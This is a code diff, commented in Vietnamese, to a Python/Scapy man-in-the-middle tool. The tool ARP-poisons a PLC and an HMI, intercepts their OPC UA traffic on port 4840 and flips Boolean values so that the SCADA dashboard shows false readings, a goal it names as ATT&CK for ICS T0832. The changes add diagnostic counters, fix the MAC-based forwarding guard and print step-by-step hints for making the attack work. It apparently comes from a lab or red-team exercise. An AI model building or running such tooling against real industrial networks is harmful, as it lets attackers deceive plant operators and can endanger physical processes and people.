@@ -92,6 +92,11 @@ stop_arp          = threading.Event()
 intercepted_count = 0
 modified_count    = 0
 
+# Bo dem chan doan cho che do spoof (phan biet diem chet).
+raw_seen_count      = 0   # tong goi sniff dua vao callback (bat ky)
+has_ether_count     = 0   # goi co lop Ether + IP
+victim_pair_count   = 0   # goi giua dung cap PLC<->HMI (theo IP)
+
 # Dat trong main(), dung boi packet_callback o che do spoof (sole-forwarder).
 ATTACKER_MAC = None
 PLC_MAC      = None
@@ -245,16 +250,26 @@ def bridge_callback(pkt, plc_ip, hmi_ip, iface):
     chi sua noi dung chieu PLC->HMI tren cong 4840. Flip Boolean giu nguyen
     do dai nen TCP sequence khong lech.
     """
-    global intercepted_count
+    global intercepted_count, raw_seen_count, has_ether_count, victim_pair_count
+
+    raw_seen_count += 1
 
     if not pkt.haslayer(Ether) or not pkt.haslayer(IP):
         return
-    # Chi forward frame duoc chuyen huong toi ta; bo qua goi ta tu ban ra.
-    if pkt[Ether].dst != ATTACKER_MAC:
-        return
+    has_ether_count += 1
+
     src_ip = pkt[IP].src
     dst_ip = pkt[IP].dst
     if {src_ip, dst_ip} != {plc_ip, hmi_ip}:
+        return
+    victim_pair_count += 1
+
+    # Chong loop bang MAC NGUON (chac chan hon Ether.dst == ATTACKER_MAC, vi
+    # get_if_hwaddr tren Windows/Npcap co the tra ve MAC lech dinh dang/nham
+    # card). Chi xu ly frame den TU 1 trong 2 nan nhan -- goi ta tu ban ra co
+    # src = ATTACKER_MAC nen bi loai tu dong, tranh vong lap. PLC_MAC/HMI_MAC
+    # lay tu ARP request nen dang tin.
+    if pkt[Ether].src not in (PLC_MAC, HMI_MAC):
         return
 
     intercepted_count += 1
@@ -284,8 +299,12 @@ def bridge_callback(pkt, plc_ip, hmi_ip, iface):
 # ── Main ──────────────────────────────────────────────────────────────────────
 def main():
     global intercepted_count, modified_count, ATTACKER_MAC, PLC_MAC, HMI_MAC
+    global raw_seen_count, has_ether_count, victim_pair_count
     intercepted_count = 0
     modified_count = 0
+    raw_seen_count = 0
+    has_ether_count = 0
+    victim_pair_count = 0
 
     plc_ip = PLC_IP_CONF
     hmi_ip = HMI_IP_CONF
@@ -332,6 +351,7 @@ def main():
         ATTACKER_MAC = get_if_hwaddr(iface)
         PLC_MAC = plc_mac
         HMI_MAC = hmi_mac
+        info(f"ATTACKER_MAC={ATTACKER_MAC}  (guard so khop Ether.src voi PLC/HMI MAC o tren)")
 
         if spoof_mode:
             # Sole-forwarder: IP forwarding cua OS PHAI TAT (neu khong -> forward kep).
@@ -407,6 +427,23 @@ def main():
     notes.append(f"Intercepted: {intercepted_count} | Modified: {modified_count}")
     notes.append("Wireshark  : opcua || arp.duplicate-address-frame")
     if spoof_mode:
+        notes.append(
+            f"DIAG counters: raw_seen={raw_seen_count} has_ether={has_ether_count} "
+            f"victim_pair={victim_pair_count} passed_mac_guard={intercepted_count}"
+        )
+        if raw_seen_count == 0:
+            notes.append("CHET TANG 1: sniff khong thay goi nao voi filter 'host X and host Y' -- co the sai IFACE hoac Npcap khong ap filter. Thu chay lai voi disrupt mode de doi chieu.")
+        elif has_ether_count == 0:
+            notes.append("CHET TANG 2: co goi nhung khong co lop Ether (cooked capture). Bao lai de doi cach doc L2.")
+        elif victim_pair_count == 0:
+            notes.append("CHET TANG 3a: co Ether nhung khong goi nao dung cap IP PLC<->HMI -- ARP poison chua chuyen huong duoc traffic OPC UA.")
+        elif intercepted_count == 0:
+            notes.append("CHET TANG 3b: co goi dung cap PLC<->HMI nhung Ether.src KHONG khop PLC_MAC/HMI_MAC -- bao lai de bo guard MAC, loc theo IP thoi.")
+        if intercepted_count == 0:
+            notes.append(
+                "SPOOF intercepted=0: xem DIAG counters o tren de biet chet tang nao. "
+                "Dam bao web_scada dang poll OPC UA luc chay."
+            )
         notes.append(
             "SPOOF mode: neu web_scada/HMI VAN KET NOI ma dashboard hien gia tri sai -> T0832 dat. "
             "Neu van treo -> scapy tren Windows khong theo kip tang goi; chuyen sang pydivert/WinDivert "
